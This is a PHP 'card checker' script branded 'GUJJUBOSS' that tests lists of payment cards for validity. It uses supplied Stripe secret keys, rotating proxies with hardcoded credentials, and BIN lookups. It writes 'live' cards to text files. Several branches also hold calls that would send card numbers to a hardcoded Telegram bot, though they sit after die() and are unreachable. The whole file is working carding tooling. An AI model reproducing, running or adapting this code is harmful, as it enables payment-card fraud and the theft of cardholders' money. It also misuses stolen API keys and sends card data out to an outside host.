<html>
<head>
<link rel='stylesheet' type='text/css' href='assets/style.css' />
</head>
</html>
<?php
recheck:
error_reporting(0);
ini_set('display_errors', 0);
require_once './libs/Curl/CurlX.php';
require './libs/init.php';

$rp1 = array(
  1 => 'gqdllwzd-rotate:lzn2z8i4g98p',
  2 => 'rdfhxgfl-rotate:9cjxt3rwoqne',
  3 => 'hjdzwrqs-rotate:6picp1bizrxt',
  4 => 'nyqodkyh-rotate:z289lorzhvls',
  5 => 'meihaycc-rotate:p157ls4t05th',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];


////////////////////////////==============[Proxy Section]===============//////////////////////////////

$url = "https://api.ipify.org/";   

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = $ip1;
//$ip = "SPIDERISOP";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

 '[ IP: '.$ip.' ] ';

 $sk = $_GET['sec'];
$lista = $_GET['lista'];
  $sk = explode(',',$sk);
$len = sizeof($sk);
 $key = $sk[rand(0,$len-1)];
$curl = new CurlX;
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "gqdllwzd-rotate:lzn2z8i4g98p");
$header = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'Authorization: Bearer '.$key.'');

$response = $curl->post($url = 'https://api.stripe.com/v1/sources', $data = 'type=card&amount=100&currency=usd&owner[name]='.$firstname.'+'.$lastname.'&owner[address][line1]='.$street.'&owner[address][state]='.$state.'&owner[address][city]='.$city.'&owner[address][postal_code]='.$zip.'&owner[address][country]=US&owner[email]='.$firstname.'.'.$lastname.'77%40gmail.com&owner[phone]=131'.$cvv.'3'.$cvv.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$month.'&card[exp_year]='.$year.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'', $header);
header('content-length: '.strlen($data), true);
 $response;
$resp = json_decode($response, true);
$token = $resp['id'];
$error = $resp['error'];
if (isset($error)) {
	$code = $error['code'];
	$dcode = $error['decline_code'];
	$msg = $error['message'];
	if (isset($dcode)) {
		$errorcode = $dcode;
		echo "<font class='badge badge-danger'>Declined</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-danger'>$errorcode</font><br>";
		die();
	}else{
		$errorcode = $code;
		echo "<font class='badge badge-danger'>Declined</font><span class='content12'><font size='3.5'> $lista </font></span><font class='badge badge-danger'>$errorcode</font><br>";
	die();
	}
}elseif (empty($response)) {
    goto recheck;
}else{

$curl2 = new CurlX;
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "gqdllwzd-rotate:lzn2z8i4g98p");
$header2 = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'Authorization: Bearer '.$key.'');
$response2 = $curl2->post($url2 = 'https://api.stripe.com/v1/customers', $data2 = 'description=Virtual Product&source='.$token.'', $header2);
 $response2;
header('content-length: '.strlen($data2), true);
$code2 = getStr($response2, '"code": "','",');
$dcode2 = getStr($response2, '"decline_code": "','",');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else {
$bin = 'Debit';
}


if (strpos($response2, '"cvc_check": "pass"')) {
    fwrite(fopen('cvv.txt', 'a'), $lista."\r\n");
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> [CVV MATCHED] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';    die();
$ch = curl_init('https://api.telegram.org/bot1199705468:AAHvShxSMVHNKCI2o-0dskzZcsoIaAcZ0M0/sendMessage?chat_id=694464048&text='.$lista.' CVV MATCH'); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
  curl_exec($ch);
}
elseif (strpos($response, '"cvc_check": "pass"')) {
    fwrite(fopen('cvv.txt', 'a'), $lista."\r\n");
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> [CVV MATCHED] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';    die();
$ch = curl_init('https://api.telegram.org/bot1199705468:AAHvShxSMVHNKCI2o-0dskzZcsoIaAcZ0M0/sendMessage?chat_id=694464048&text='.$lista.' CVV MATCH'); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
  curl_exec($ch);
}
elseif  (preg_match('/\bincorrect_zip\b/', $response2)) {
    fwrite(fopen('cvv.txt', 'a'), $lista."\r\n");
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> [CVV MATCHED & INCORRECT ZIP] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';    die();   
  $ch = curl_init('https://api.telegram.org/bot1199705468:AAHvShxSMVHNKCI2o-0dskzZcsoIaAcZ0M0/sendMessage?chat_id=694464048&text='.$lista.' CVV MATCH'); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
  curl_exec($ch);
}
  elseif (strpos($response, 'security code is incorrect')) {
    fwrite(fopen('cvv.txt', 'a'), $lista."\r\n");
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> [CCN MATCHED] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';    die();
$ch = curl_init('https://api.telegram.org/bot1199705468:AAHvShxSMVHNKCI2o-0dskzZcsoIaAcZ0M0/sendMessage?chat_id=694464048&text='.$lista.' CCN MATCH'); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
  curl_exec($ch);
}
    elseif (strpos($response, 'Your card has insufficient funds.')) {
    fwrite(fopen('cvv.txt', 'a'), $lista."\r\n");
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> [INSUFFICIENT FUND] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';    die();
$ch = curl_init('https://api.telegram.org/bot1199705468:AAHvShxSMVHNKCI2o-0dskzZcsoIaAcZ0M0/sendMessage?chat_id=694464048&text='.$lista.' INSUFFICIENT FUND'); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
  curl_exec($ch);
}
elseif 
 (preg_match('/\bincorrect_zip\b/', $response)) {
    fwrite(fopen('cvv.txt', 'a'), $lista."\r\n");
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> [CVV MATCHED & INCORRECT ZIP] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';    die();   
  $ch = curl_init('https://api.telegram.org/bot1199705468:AAHvShxSMVHNKCI2o-0dskzZcsoIaAcZ0M0/sendMessage?chat_id=694464048&text='.$lista.' CVV MATCH'); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
  curl_exec($ch);
}elseif (strpos($response2, '"cvc_check": "unchecked"')) {
echo '<font size=3.5 color="white"><font class="badge badge-danger">#DECLINED </i></font> <font class="badge badge-danger"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-danger"> [CVC : UNCHECKED] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';    die();
}elseif (strpos($response2, '"cvc_check": "unavailable"')) {
echo '<font size=3.5 color="white"><font class="badge badge-danger">#DECLINED </i></font> <font class="badge badge-danger"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-danger"> [CVC : UNAVAILABLE] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';    die();
}elseif (strpos($response2, '"cvc_check": "fail"')) {
    fwrite(fopen('live_fresh_ccn.txt', 'a'), $lista."\r\n");
echo '<font size=3.5 color="white"><font class="badge badge-danger">#DECLINED </i></font> <font class="badge badge-danger"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-danger"> [CVC : FAIL] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';    die();
}elseif (strpos($response2, 'incorrect_cvc')) {
    fwrite(fopen('live_fresh_ccn.txt', 'a'), $lista."\r\n");
echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> [CCN MATCHED] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';    die();
$ch = curl_init('https://api.telegram.org/bot1199705468:AAHvShxSMVHNKCI2o-0dskzZcsoIaAcZ0M0/sendMessage?chat_id=694464048&text='.$lista.' CC MATCH'); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
  curl_exec($ch);
}elseif (empty($response2)) {
    goto recheck;
}elseif (empty($dcode2)) {
echo '<font size=3.5 color="white"><font class="badge badge-danger">#DECLINED </i></font> <font class="badge badge-danger"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-danger"> ['.$code2.'] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';}else{
echo '<font size=3.5 color="white"><font class="badge badge-danger">#DECLINED </i></font> <font class="badge badge-danger"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-danger"> ['.$dcode2.'] </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">GUJJUBOSS</font><br>';	die();
}
}